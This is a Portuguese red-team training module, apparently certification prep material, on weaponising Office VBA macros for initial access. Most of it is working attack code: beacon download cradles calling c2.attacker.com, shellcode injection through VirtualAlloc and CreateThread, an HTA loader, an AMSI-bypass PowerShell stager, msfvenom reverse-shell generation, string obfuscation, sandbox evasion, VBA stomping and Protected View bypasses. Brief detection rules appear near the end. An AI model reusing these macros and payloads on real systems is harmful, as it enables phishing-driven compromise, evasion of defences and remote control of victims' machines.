---
title: "Office VBA Macros"
---

# Office VBA Macros

## VBA Continua Vivo Décadas Depois

Macros VBA (Visual Basic for Applications) em documentos Office são vetor de acesso inicial clássico que segue eficaz décadas depois. Apesar das mitigações da Microsoft (Protected View, Mark of the Web, bloqueio de macros de internet), macros ainda funcionam em red team por cinco razões: organizações precisam de macros pra operação legítima (financeiro, contabilidade, automação) e não conseguem desabilitar globalmente, macro bem obfuscada evade análise estática de AV/EDR, execução roda dentro de processo legítimo do Office (winword.exe, excel.exe), payload pode ser entregue 100% em memória sem tocar disco, e usuários ainda abrem documentos com macro quando o contexto é convincente.

Pra CRTO e OSEP é fundamental entender não só como escrever macro maliciosa, mas como ela interage com o runtime do Office, quais mecanismos de detecção dispara, e como estruturar código pra maximizar sucesso contra defesas modernas. MITRE ATT&CK: T1566.001 (Spear Phishing Attachment), T1204.002 (User Execution), T1059.005 (Visual Basic), T1027 (Obfuscated Files), T1218 (System Binary Proxy Execution).

---

## O Runtime VBA Dentro do Office

### O Runtime VBA no Office

VBA é uma linguagem de programação interpretada embutida no Microsoft Office. Cada aplicativo Office (Word, Excel, PowerPoint, Access, Outlook) possui seu próprio runtime VBA, mas compartilham o mesmo mecanismo central: o VBA engine hospedado dentro do processo do aplicativo.

Quando o Word abre um .docm ou .doc com macros e o usuário habilita macros:
1. O VBA engine é inicializado dentro do processo `winword.exe`
2. O código VBA é compilado para p-code (bytecode intermediário)
3. O p-code é executado pelo interpretador VBA
4. O código VBA tem acesso ao Object Model do Office e ao sistema operacional via COM

**Object Model do Office**: O Word e Excel expõem um modelo de objetos COM rico. Via VBA, você pode manipular documentos, interagir com o sistema de arquivos, chamar APIs do Windows, criar processos, e muito mais.

### Auto-Execute Triggers

VBA pode ser executado automaticamente sem interação do usuário (além de habilitar macros):

**Word:**
- `AutoOpen()` - executa quando o documento é aberto
- `Document_Open()` - evento do objeto Document, executa na abertura
- `AutoClose()` - executa quando o documento é fechado
- `AutoNew()` - executa quando um novo documento é criado baseado no template
- `Document_Close()` - evento de fechamento

**Excel:**
- `Workbook_Open()` - executa quando a planilha é aberta (no módulo ThisWorkbook)
- `Auto_Open()` - executa automaticamente na abertura (em módulo padrão)
- `Workbook_Activate()` - executa quando a janela é ativada
- `Auto_Close()` - executa ao fechar

**Preferência para red team**: `Document_Open()` e `Workbook_Open()` são preferíveis pois são eventos do objeto, mais difíceis de detectar que sub-rotinas simples com nomes `AutoOpen`.

### Métodos de Execução de Shell

VBA oferece múltiplas formas de executar comandos externos, com diferentes características de detecção:

**1. Shell() nativo do VBA:**
```vba
Shell "cmd.exe /c whoami", vbHide
```
- Mais simples mas facilmente detectável
- Sempre cria processo filho de winword.exe/excel.exe
- AV/EDR detectam padrão Shell() + comando suspeito

**2. WScript.Shell via CreateObject:**
```vba
Set oShell = CreateObject("WScript.Shell")
oShell.Run "powershell.exe -enc BASE64PAYLOAD", 0, False
```
- Mais flexível
- `0` = janela oculta
- `False` = não aguardar conclusão

**3. Shell.Application via CreateObject:**
```vba
Set oShell = CreateObject("Shell.Application")
oShell.ShellExecute "powershell.exe", "-enc BASE64PAYLOAD", "", "open", 0
```
- Cria processo com menor rastreabilidade em alguns EDRs
- ShellExecute é uma API de alto nível

**4. XMLHTTP para download:**
```vba
Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP")
oXMLHTTP.Open "GET", "http://attacker.com/payload.ps1", False
oXMLHTTP.Send
' Payload está em oXMLHTTP.responseBody ou oXMLHTTP.responseText
```

**5. WMI para execução:**
```vba
Set oWMI = GetObject("winmgmts:Win32_Process")
oWMI.Create "powershell.exe -enc BASE64"
```
- Processo criado pelo WMI provider, não diretamente pelo Office
- Pode quebrar a cadeia de processos pai-filho

### Download Cradle em VBA (IEX equivalente)

O padrão mais comum para delivery de payload via macro é o "download cradle": código VBA que baixa e executa um payload PowerShell sem salvar em disco.

```vba
' Padrão básico de download cradle
Dim oXMLHTTP As Object
Dim oShell As Object

Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP")
oXMLHTTP.Open "GET", "http://attacker.com/stager.ps1", False
oXMLHTTP.Send

Set oShell = CreateObject("WScript.Shell")
oShell.Run "powershell.exe -nop -w hidden -enc " & EncodeBase64(oXMLHTTP.responseText), 0
```

Porém, `MSXML2.XMLHTTP` faz conexão via processo do Office, o que é detectável. Alternativa mais furtiva usa `WinHttp.WinHttpRequest.5.1`:

```vba
Set oHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
oHTTP.Open "GET", "http://attacker.com/stager.ps1", False
oHTTP.Send
' Esta conexão aparece como originada do svchost/winhttp, não do Office
```

### Protected View e Mark of the Web (MotW)

**Protected View** é ativado quando:
- O arquivo vem de localização de internet (download do browser)
- O arquivo está em localização de baixa confiança
- O arquivo foi aberto de email (Outlook)
- O arquivo está corrompido ou potencialmente inseguro

Quando em Protected View, macros são completamente desabilitadas e o usuário vê um banner amarelo "HABILITAR EDIÇÃO" antes de poder habilitar macros.

**Mark of the Web (MotW)** é um Alternate Data Stream (ADS) adicionado pelo Windows quando um arquivo é baixado da internet. O ADS `Zone.Identifier` contém metadados sobre a origem:
```
[ZoneTransfer]
ZoneId=3
ReferrerUrl=https://somesite.com
HostUrl=https://somesite.com/file.docm
```

ZoneId=3 = Internet Zone → aciona Protected View.

**Técnicas para bypassar Protected View:**
1. **ISO/IMG container**: Arquivos dentro de ISOs montados não têm MotW propagado (corrigido parcialmente no Windows 11 22H2)
2. **ZIP protegido por senha**: Alguns clientes de ZIP não propagam MotW para conteúdo extraído
3. **WebDAV**: Abrir arquivo via caminho UNC `\\attacker.com\share\doc.docm` não aciona Protected View em algumas configurações
4. **Template Injection**: O documento inicial não tem macros, mas injeta um template remoto que tem
5. **Engenharia social direta**: Instruir o usuário a clicar "Habilitar Edição" e depois "Habilitar Conteúdo"

---

## Na Prática

### Fluxo de Desenvolvimento de Macro Maliciosa

1. Desenvolver payload (shellcode/beacon) no C2 framework
2. Gerar stager em PowerShell (IEX download cradle)
3. Codificar o stager em Base64 para evitar parsing
4. Escrever a macro VBA que executa o stager
5. Obfuscar o VBA para evadir análise estática
6. Embutir a macro em documento convincente (lure document)
7. Testar em ambiente isolado contra AV/EDR alvo
8. Entregar via phishing

### Obfuscação VBA Avançada

**String Splitting**: Dividir strings suspeitas
```vba
' Ao invés de:
Dim cmd As String
cmd = "powershell.exe"

' Usar:
Dim cmd As String
cmd = "power" & Chr(115) & "hell.exe"
' Ou:
cmd = "po" & "wer" & "sh" & "ell" & ".exe"
```

**Chr() Encoding**: Converter caracteres para valores ASCII
```vba
' "cmd" em Chr encoding
Dim s As String
s = Chr(99) & Chr(109) & Chr(100)  ' = "cmd"

' Função helper para encodar string completa
Function EncStr(s As String) As String
    Dim i As Integer, result As String
    For i = 1 To Len(s)
        result = result & "Chr(" & Asc(Mid(s, i, 1)) & ") & "
    Next i
    EncStr = Left(result, Len(result) - 3)
End Function
```

**Variable Naming Obfuscation**: Usar nomes de variáveis inócuos
```vba
' Ao invés de:
Dim shellCommand As String
Dim wshObject As Object

' Usar:
Dim documentTitle As String
Dim fontRenderer As Object
```

**Function Decomposition**: Dividir código em múltiplas funções
```vba
Private Function GetPartA() As String
    GetPartA = "powers"
End Function

Private Function GetPartB() As String
    GetPartB = "hell.e"
End Function

Private Function GetPartC() As String
    GetPartC = "xe"
End Function

Private Function GetExecutable() As String
    GetExecutable = GetPartA() & GetPartB() & GetPartC()
End Function
```

**Dead Code Insertion**: Adicionar código inócuo para confundir análise
```vba
' Código falso que parece legítimo mas não faz nada malicioso
Sub FormatSpreadsheet()
    Dim wsSheet As Worksheet
    Dim rngData As Range
    For Each wsSheet In ActiveWorkbook.Worksheets
        wsSheet.Columns.AutoFit
    Next wsSheet
    Application.ScreenUpdating = True
End Sub
```

### HTA Files (HTML Applications)

HTAs são arquivos HTML com extensão `.hta` executados pelo `mshta.exe`. Diferente de HTML normal em browser, HTAs têm acesso completo ao sistema via ActiveX/COM objects e VBScript/JScript, sem sandboxing.

Um HTA pode ser entregue via email, link de phishing, ou macro VBA.

---

## Exemplos de Código / Comandos

### Macro VBA Completa - Download e Execução de Beacon

```vba
' Módulo: Module1
' Documento: Word (.docm) ou Excel (.xlsm)
' Propósito: Download e execução de Cobalt Strike beacon via PowerShell cradle

Option Explicit

' Ponto de entrada para Word
Private Sub Document_Open()
    ExecutePayload
End Sub

' Ponto de entrada para Excel
Private Sub Workbook_Open()
    ExecutePayload
End Sub

' Ponto de entrada alternativo (Word)
Sub AutoOpen()
    ExecutePayload
End Sub

' Função principal de execução
Private Sub ExecutePayload()
    ' Verificações de ambiente para sandbox detection
    If IsSandbox() Then Exit Sub
    
    ' Construir URL do C2 (obfuscado)
    Dim c2Host As String
    c2Host = GetC2Host()
    
    ' Construir comando PowerShell (obfuscado)
    Dim psCmd As String
    psCmd = BuildPowerShellCommand(c2Host)
    
    ' Executar via WScript.Shell
    Dim oShell As Object
    Set oShell = CreateObject(Obf("WScript.Shell"))
    oShell.Run psCmd, 0, False
    
    ' Cleanup
    Set oShell = Nothing
End Sub

' Verificação básica de sandbox/análise
Private Function IsSandbox() As Boolean
    IsSandbox = False
    
    ' Verificar username suspeito (sandboxes frequentemente usam esses)
    Dim suspiciousUsers() As String
    suspiciousUsers = Split("SANDBOX,MALWARE,CUCKOO,ANALYST,VIRUS,JOHN,ADMINISTRATOR", ",")
    
    Dim i As Integer
    Dim currentUser As String
    currentUser = UCase(Environ("USERNAME"))
    
    For i = 0 To UBound(suspiciousUsers)
        If InStr(currentUser, suspiciousUsers(i)) > 0 Then
            IsSandbox = True
            Exit Function
        End If
    Next i
    
    ' Verificar se tem número de processadores razoável (sandboxes geralmente têm 1-2)
    ' Verificação via WMI
    On Error Resume Next
    Dim oWMI As Object
    Set oWMI = GetObject("winmgmts:\\.\root\cimv2")
    
    Dim oProcessors As Object
    Set oProcessors = oWMI.ExecQuery("SELECT * FROM Win32_Processor")
    
    Dim processorCount As Integer
    processorCount = oProcessors.Count
    
    If processorCount < 2 Then
        IsSandbox = True
        Exit Function
    End If
    
    ' Verificar quantidade de RAM (sandboxes geralmente têm menos de 2GB)
    Dim oCS As Object
    Set oCS = oWMI.ExecQuery("SELECT * FROM Win32_ComputerSystem")
    
    Dim oItem As Object
    For Each oItem In oCS
        Dim totalRAM As Long
        totalRAM = CLng(oItem.TotalPhysicalMemory / 1073741824)  ' Converter para GB
        If totalRAM < 2 Then
            IsSandbox = True
            Exit Function
        End If
    Next oItem
    
    On Error GoTo 0
    
    ' Verificar se está sendo executado via análise automatizada
    ' (verificar processos comuns de sandbox)
    Dim suspiciousProcs() As String
    suspiciousProcs = Split("VMSRVC,VBOXSERVICE,VMTOOLSD,WIRESHARK,PROCESSHACKER,OLLYDBG", ",")
    
    Dim oProcesses As Object
    Set oProcesses = oWMI.ExecQuery("SELECT Name FROM Win32_Process")
    
    For Each oItem In oProcesses
        For i = 0 To UBound(suspiciousProcs)
            If InStr(UCase(oItem.Name), suspiciousProcs(i)) > 0 Then
                IsSandbox = True
                Exit Function
            End If
        Next i
    Next oItem
End Function

' Obter host C2 (string obfuscada)
Private Function GetC2Host() As String
    ' URL do C2 dividida para evitar detecção por string scanning
    ' Em produção: substituir pela URL real do C2
    Dim part1 As String, part2 As String, part3 As String
    part1 = Chr(104) & Chr(116) & Chr(116) & Chr(112)  ' "http"
    part2 = Chr(115) & Chr(58) & Chr(47) & Chr(47)      ' "s://"
    part3 = "c2" & Chr(46) & "attacker" & Chr(46) & "com"  ' "c2.attacker.com"
    GetC2Host = part1 & part2 & part3
End Function

' Construir comando PowerShell completo
Private Function BuildPowerShellCommand(c2Host As String) As String
    ' Stager PowerShell que baixa e executa o beacon em memória
    ' IEX (Invoke-Expression) do conteúdo baixado
    Dim stager As String
    stager = "IEX (New-Object Net.WebClient).DownloadString('" & c2Host & "/stage.ps1')"
    
    ' Encodar em Base64 (UTF-16LE é o padrão para PowerShell -enc)
    Dim encodedStager As String
    encodedStager = EncodeToBase64Unicode(stager)
    
    ' Construir linha de comando completa
    Dim psExe As String
    psExe = Environ("WINDIR") & Chr(92) & "System32" & Chr(92) & Obf("WindowsPowerShell") & _
            Chr(92) & "v1.0" & Chr(92) & Obf("powershell.exe")
    
    Dim psArgs As String
    psArgs = " -NoP -NonI -W Hidden -Enc " & encodedStager
    
    BuildPowerShellCommand = Chr(34) & psExe & Chr(34) & psArgs
End Function

' Obfuscar strings simples (ROT13 simples como exemplo)
' Em produção usar algo mais robusto
Private Function Obf(s As String) As String
    ' Neste caso, retorna a string como está
    ' Substituir por sua lógica de deobfuscação
    Obf = s
End Function

' Encodar string em Base64 (UTF-16LE para PowerShell)
Private Function EncodeToBase64Unicode(inputStr As String) As String
    Dim oXML As Object
    Dim oNode As Object
    
    Set oXML = CreateObject("MSXML2.DOMDocument.6.0")
    Set oNode = oXML.createElement("b64")
    
    ' Converter string para bytes UTF-16LE e encodar em Base64
    oNode.DataType = "bin.base64"
    oNode.nodeTypedValue = StringToUTF16LE(inputStr)
    
    EncodeToBase64Unicode = Replace(oNode.Text, vbLf, "")
    
    Set oNode = Nothing
    Set oXML = Nothing
End Function

' Converter string VBA (UTF-16) para array de bytes UTF-16LE
Private Function StringToUTF16LE(s As String) As Byte()
    Dim bytes() As Byte
    bytes = s  ' VBA strings são internamente UTF-16LE
    StringToUTF16LE = bytes
End Function
```

### Macro Excel - Workbook_Open com WMI

```vba
' No módulo ThisWorkbook do Excel
' Usa WMI para criar processo e quebrar cadeia pai-filho

Private Sub Workbook_Open()
    Dim sCmd As String
    
    ' Construir comando (substituir pelo stager real)
    sCmd = "powershell.exe -nop -w hidden -c " & Chr(34) & _
           "IEX(New-Object Net.WebClient).DownloadString(" & Chr(39) & _
           "https://c2.attacker.com/s" & Chr(39) & ")" & Chr(34)
    
    ' Usar WMI para criar processo
    ' Vantagem: processo filho não é winword/excel mas WmiPrvSE
    Dim oWMI As Object
    Dim oProcess As Object
    
    Set oWMI = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
    oWMI.Create sCmd, Null, Null, 0
    
    Set oWMI = Nothing
End Sub
```

### Macro com Shellcode Direto via VirtualAlloc (Técnica Avançada)

```vba
' Injeção de shellcode diretamente em memória via Windows API
' Requer declares de API do Windows

' Declarações de API (no topo do módulo)
#If VBA7 Then
    ' 64-bit Office
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As LongPtr, _
        ByVal dwSize As Long, _
        ByVal flAllocationType As Long, _
        ByVal flProtect As Long) As LongPtr
    
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
        ByVal Destination As LongPtr, _
        ByRef Source As Any, _
        ByVal Length As Long) As LongPtr
    
    Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
        ByVal lpThreadAttributes As LongPtr, _
        ByVal dwStackSize As Long, _
        ByVal lpStartAddress As LongPtr, _
        ByVal lpParameter As LongPtr, _
        ByVal dwCreationFlags As Long, _
        ByRef lpThreadId As Long) As LongPtr
    
    Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
        ByVal hHandle As LongPtr, _
        ByVal dwMilliseconds As Long) As Long
#Else
    ' 32-bit Office
    Private Declare Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As Long, _
        ByVal dwSize As Long, _
        ByVal flAllocationType As Long, _
        ByVal flProtect As Long) As Long
    
    Private Declare Function RtlMoveMemory Lib "kernel32" ( _
        ByVal Destination As Long, _
        ByRef Source As Any, _
        ByVal Length As Long) As Long
    
    Private Declare Function CreateThread Lib "kernel32" ( _
        ByVal lpThreadAttributes As Long, _
        ByVal dwStackSize As Long, _
        ByVal lpStartAddress As Long, _
        ByVal lpParameter As Long, _
        ByVal dwCreationFlags As Long, _
        ByRef lpThreadId As Long) As Long
    
    Private Declare Function WaitForSingleObject Lib "kernel32" ( _
        ByVal hHandle As Long, _
        ByVal dwMilliseconds As Long) As Long
#End If

' Constantes
Const MEM_COMMIT = &H1000
Const MEM_RESERVE = &H2000
Const PAGE_EXECUTE_READWRITE = &H40

Sub Document_Open()
    ExecuteShellcode
End Sub

Sub ExecuteShellcode()
    ' Shellcode de exemplo: calc.exe (x64)
    ' Em produção: substituir pelo shellcode do Cobalt Strike/Havoc/Sliver
    ' Gerado com: msfvenom -p windows/x64/exec CMD=calc.exe -f vbapplication
    Dim buf() As Byte
    buf = Array( _
        232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, _
        139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, _
        40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, _
        2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82 _
        ' ... resto do shellcode truncado para exemplo ...
    )
    
    ' Alocar memória executável
    Dim lpMemory As LongPtr
    lpMemory = VirtualAlloc(0, UBound(buf) + 1, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    
    If lpMemory = 0 Then Exit Sub
    
    ' Copiar shellcode para memória alocada
    Dim i As Long
    For i = 0 To UBound(buf)
        RtlMoveMemory lpMemory + i, buf(i), 1
    Next i
    
    ' Criar thread para executar o shellcode
    Dim hThread As LongPtr
    Dim threadId As Long
    hThread = CreateThread(0, 0, lpMemory, 0, 0, threadId)
    
    ' Aguardar execução (opcional - pode deixar em background)
    ' WaitForSingleObject hThread, -1
End Sub
```

### Template Injection via DCOM

```vba
' Técnica: usar macro em documento Word para executar payload
' remotamente em outro computador da rede via DCOM

Sub RunRemoteViaOffice()
    ' Requer credenciais e acesso DCOM ao alvo
    Dim strTarget As String
    strTarget = "192.168.1.100"  ' IP do alvo
    
    ' Criar instância remota do Word via DCOM
    Dim oWord As Object
    oWord = CreateObject("Word.Application", strTarget)
    oWord.Visible = False
    
    ' Executar macro remotamente
    Dim oDoc As Object
    Set oDoc = oWord.Documents.Add()
    
    ' Adicionar e executar código VBA remotamente
    Dim oModule As Object
    Set oModule = oDoc.VBProject.VBComponents.Add(1)  ' 1 = vbext_ct_StdModule
    
    Dim sCode As String
    sCode = "Sub AutoRun()" & vbCrLf
    sCode = sCode & "  Shell ""powershell.exe -enc BASE64PAYLOAD"", vbHide" & vbCrLf
    sCode = sCode & "End Sub"
    
    oModule.CodeModule.AddFromString sCode
    
    ' Executar a macro
    oWord.Run "AutoRun"
    
    ' Limpar
    oDoc.Close False
    oWord.Quit
    Set oWord = Nothing
End Sub
```

### HTA File Completo com VBScript

```html
<!-- payload.hta - Executado via mshta.exe -->
<!-- Tem acesso completo ao sistema, sem sandbox de browser -->
<html>
<head>
<title>Loading...</title>
<HTA:APPLICATION
  ID="oHTA"
  APPLICATIONNAME="Loader"
  BORDER="none"
  BORDERSTYLE="none"
  CAPTION="no"
  MAXIMIZEBUTTON="no"
  MINIMIZEBUTTON="no"
  SCROLL="no"
  SHOWINTASKBAR="no"
  SINGLEINSTANCE="yes"
  SYSMENU="no"
  WINDOWSTATE="minimize"
/>
</head>
<body>
<script language="VBScript">
' HTA tem privilégios do usuário atual mas sem sandbox
' CreateObject funciona normalmente

Dim oShell
Set oShell = CreateObject("WScript.Shell")

' Executar PowerShell stager
Dim psCmd
psCmd = "powershell.exe -NoP -NonI -W Hidden -Enc " & _
        "SUVYKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL2MyLmF0dGFja2VyLmNvbS9zdGFnZXIucHMxJykp"

oShell.Run psCmd, 0, False

' Fechar a HTA imediatamente para não chamar atenção
' (a janela estava minimizada de qualquer forma)
window.close()
</script>
</body>
</html>
```

### Macro que Cria e Executa HTA

```vba
' Macro VBA que escreve um HTA em disco e executa via mshta
' Útil quando quiser separar o payload do documento Office

Sub CreateAndRunHTA()
    Dim htaContent As String
    Dim htaPath As String
    
    ' Construir conteúdo do HTA
    htaContent = "<html><head><HTA:APPLICATION SHOWINTASKBAR=" & Chr(34) & "no" & Chr(34) & "/></head>" & vbCrLf
    htaContent = htaContent & "<body><script language=" & Chr(34) & "VBScript" & Chr(34) & ">" & vbCrLf
    htaContent = htaContent & "CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ").Run " & Chr(34) & _
                 "powershell.exe -nop -w hidden -enc PAYLOAD_BASE64" & Chr(34) & ",0" & vbCrLf
    htaContent = htaContent & "window.close()" & vbCrLf
    htaContent = htaContent & "</script></body></html>"
    
    ' Caminho para arquivo HTA temporário
    htaPath = Environ("TEMP") & "\update.hta"
    
    ' Escrever HTA em disco
    Dim fileNum As Integer
    fileNum = FreeFile
    Open htaPath For Output As #fileNum
    Print #fileNum, htaContent
    Close #fileNum
    
    ' Executar via mshta
    Dim oShell As Object
    Set oShell = CreateObject("WScript.Shell")
    oShell.Run "mshta.exe " & Chr(34) & htaPath & Chr(34), 0, False
    
    ' Aguardar 5 segundos e deletar o HTA
    Application.Wait Now + TimeValue("00:00:05")
    Kill htaPath
End Sub
```

### Geração de Payload Base64 para Macro (PowerShell)

```powershell
# Gerar stager encodado para inserir na macro VBA
# Executar este código no Kali/Linux para gerar o payload

# Stager básico (Cobalt Strike)
$stager = "IEX (New-Object Net.WebClient).DownloadString('https://c2.attacker.com/stager.ps1')"

# Encodar em Base64 UTF-16LE (necessário para -enc do PowerShell)
$encodedStager = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($stager))
Write-Output "Encoded stager:"
Write-Output $encodedStager

# Stager mais avançado (bypass AMSI + IEX)
$advancedStager = @'
$a=[Ref].Assembly.GetTypes();
Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};
$d=$c.GetFields('NonPublic,Static');
Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};
$g=$f.GetValue($null);
[IntPtr]$ptr=$g;
[Int32[]]$buf=@(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1);
IEX(New-Object Net.WebClient).DownloadString('https://c2.attacker.com/s.ps1')
'@

$encodedAdvanced = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($advancedStager))
Write-Output "Advanced stager (with AMSI bypass):"
Write-Output $encodedAdvanced

# Verificar decodificando de volta
$decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedAdvanced))
Write-Output "Decoded (verification):"
Write-Output $decoded
```

### Macro com Obfuscação de String Completa

```vba
' Versão completa com strings obfuscadas via Chr encoding
' Menos legível por análise estática de AV

Private Sub Workbook_Open()
    ' "powershell.exe" obfuscado em Chr
    Dim sExe As String
    sExe = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & _
           Chr(104) & Chr(101) & Chr(108) & Chr(108) & Chr(46) & Chr(101) & _
           Chr(120) & Chr(101)
    
    ' "-nop -w hidden -enc" obfuscado
    Dim sArgs As String
    sArgs = Chr(45) & Chr(110) & Chr(111) & Chr(112) & Chr(32) & Chr(45) & _
            Chr(119) & Chr(32) & Chr(104) & Chr(105) & Chr(100) & Chr(100) & _
            Chr(101) & Chr(110) & Chr(32) & Chr(45) & Chr(101) & Chr(110) & _
            Chr(99) & Chr(32)
    
    ' "WScript.Shell" obfuscado
    Dim sShellCOM As String
    sShellCOM = Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & _
                Chr(116) & Chr(46) & Chr(83) & Chr(104) & Chr(101) & Chr(108) & _
                Chr(108)
    
    ' Payload Base64 (substituir pelo real)
    Dim sPayload As String
    sPayload = "SUVYKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL2MyLmF0dGFja2VyLmNvbS9zdGFnZXIucHMxJykp"
    
    ' Executar
    Dim oShell As Object
    Set oShell = CreateObject(sShellCOM)
    oShell.Run sExe & " " & sArgs & sPayload, 0, False
    Set oShell = Nothing
End Sub
```

### Verificação e Teste de Macro

```bash
# No Kali Linux: gerar shellcode para inserir na macro VBA
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=attacker.com LPORT=443 \
  -f vbapplication \
  -o shellcode.vba

# Gerar shellcode para Cobalt Strike (via aggressor script)
# No Cobalt Strike: Attacks > Packages > Windows Executable (S)
# Selecionar: Output = Raw, x64, Stager
# O shellcode .bin gerado pode ser convertido para array VBA:
python3 -c "
data = open('beacon.bin', 'rb').read()
print('Dim buf() As Byte')
arr = ', '.join([str(b) for b in data])
print(f'buf = Array({arr})')
"

# Testar análise estática do documento com oletools
pip3 install oletools
olevba documento_com_macro.docm
oleid documento_com_macro.docm

# Verificar strings suspeitas detectadas
mraptor documento_com_macro.docm

# Testar em sandbox (CAPE, Any.run, Hatching Triage)
# Upload para: https://tria.ge ou https://app.any.run

# Verificar detecção de AV
# Upload para: https://antiscan.me (não distribui para AV vendors)
# NUNCA usar VirusTotal para payloads de engajamento real
```

---

## Detecção e OPSEC

### O Que os Defenders Veem

**Processo de criação (Sysmon Event ID 1):**
```
ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe -nop -w hidden -enc BASE64...
```

Esta cadeia `winword.exe → powershell.exe` é uma das detecções mais básicas em qualquer SIEM/EDR. **Precisa ser quebrada.**

**Técnicas para quebrar a cadeia pai-filho:**
1. WMI Process Create (processo filho vira WmiPrvSE.exe)
2. Scheduled Task (processo filho vira taskeng.exe ou schtasks)
3. DCOM (processo com pai diferente)
4. Process Injection (injetar no processo em vez de criar filho)

### Detecção via Análise Estática do Documento

**oletools - ferramenta de análise:**
```bash
# Analisar macro
olevba -a documento.docm

# Indicadores que levantam flag:
# - Shell, WScript.Shell, CreateObject
# - Auto-execute: AutoOpen, Document_Open
# - Download: XMLHTTP, WinHttp, URLDownloadToFile
# - Base64: Base64, atob, FromBase64String
# - Network: http://, https://, ftp://
```

**Técnicas para evadir análise estática:**
1. **VBA Stomping**: Armazenar código VBA no p-code mas corromper o source. oletools vê source vazio, mas p-code executa.
2. **Blocos de texto em TextBox**: Armazenar partes do payload em TextBoxes ocultas no documento.
3. **Propriedades de documento**: Armazenar payload em propriedades CustomDocumentProperties.
4. **Ambiente externo**: Não incluir payload no documento; buscá-lo em runtime (DNS TXT record, pastebin, CDN).

### VBA Stomping (Técnica Avançada)

```python
#!/usr/bin/env python3
"""
VBA Stomping: Substituir VBA source por código inocente
mas preservar o p-code malicioso que realmente executa.
Requer EvilClippy ou manipulação direta do formato OLE.
"""

# EvilClippy - ferramenta para VBA stomping
# https://github.com/outflanknl/EvilClippy

# Primeiro criar documento com macro real
# Depois usar EvilClippy para substituir source por código falso

# Compilar EvilClippy
# git clone https://github.com/outflanknl/EvilClippy
# cd EvilClippy && dotnet build

# Uso:
# ./EvilClippy.exe -s fake_macro.vba documento_original.docm
# Onde fake_macro.vba contém código VBA inócuo
# O p-code do original é preservado mas o source é substituído

# fake_macro.vba (código inócuo que será visto por olevba):
fake_vba = '''
Sub Document_Open()
    ' Formatação automática de tabelas
    Dim oTable As Table
    For Each oTable In ActiveDocument.Tables
        oTable.AutoFitBehavior wdAutoFitWindow
    Next oTable
End Sub
'''

# Quando analisado, olevba vê apenas código de formatação
# Mas ao executar, o p-code original (malicioso) é executado
```

### Regras de Detecção (Blue Team)

**Sigma Rule para detecção de macro execução suspeita:**
```yaml
title: Office Application Spawning Suspicious Process
status: production
description: Detecta processo Office criando processos suspeitos
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith:
      - '\WINWORD.EXE'
      - '\EXCEL.EXE'
      - '\POWERPNT.EXE'
      - '\OUTLOOK.EXE'
    Image|endswith:
      - '\powershell.exe'
      - '\cmd.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\mshta.exe'
      - '\regsvr32.exe'
      - '\rundll32.exe'
  condition: selection
level: high
tags:
  - attack.initial_access
  - attack.t1566.001
  - attack.execution
  - attack.t1204.002
```

**Splunk SPL para detectar download via Office:**
```spl
index=endpoint sourcetype=sysmon EventCode=3
| where ParentImage LIKE "%WINWORD%" OR ParentImage LIKE "%EXCEL%"
| where Image LIKE "%powershell%" OR Image LIKE "%wscript%"
| stats count by Computer, ParentImage, Image, DestinationIp, DestinationPort
| sort -count
```

### OPSEC Checklist para Macros

```
[ ] Macro testada contra AV/EDR do cliente (se conhecido)
[ ] Cadeia pai-filho quebrada (não winword->powershell direto)
[ ] Strings suspeitas obfuscadas (Shell, Download, Create)
[ ] Sandbox detection implementada
[ ] C2 URL não hardcoded como string clara
[ ] Payload baixado em memória, não salvo em disco
[ ] Documento tem conteúdo convincente (não é documento vazio)
[ ] Protected View bypassado via método adequado (ISO, WebDAV)
[ ] Testado em VM com configuração similar ao alvo
[ ] Nenhum dado identificável do operador no documento
    (Remover: File > Options > General > User Name)
    (VBA: Application.UserName = "")
[ ] Metadata do documento limpa
    (File > Info > Check for Issues > Inspect Document)
[ ] Testado sem acesso à internet para verificar falhas graceful
```

---

## Módulos Relacionados

`01_phishing_e_engenharia_social.md` cobre delivery do documento via campanha de phishing. `03_windows_script_host.md` traz HTA e WSH como alternativa às macros VBA. `06_reconhecimento_passivo.md` é OSINT pra criar lure document convincente. `04_evasao/01_av_evasao_introducao.md` cobre técnicas avançadas de evasão após execução. `05_injecao_de_processo/02_tecnicas_classicas_e_avancadas.md` cobre injeção a partir da macro. MITRE ATT&CK: T1566.001, T1204.002, T1059.005, T1027, T1027.009, T1218.005.

---

## Leitura Complementar

- oletools — https://github.com/decalage2/oletools
- EvilClippy — https://github.com/outflanknl/EvilClippy
- DotNetToJScript — https://github.com/tyranid/DotNetToJScript
- Sektor7 — Offensive VBA
- CRTO — Macros and Office exploits module
- Matt Hand — *Evading EDR* (No Starch Press)
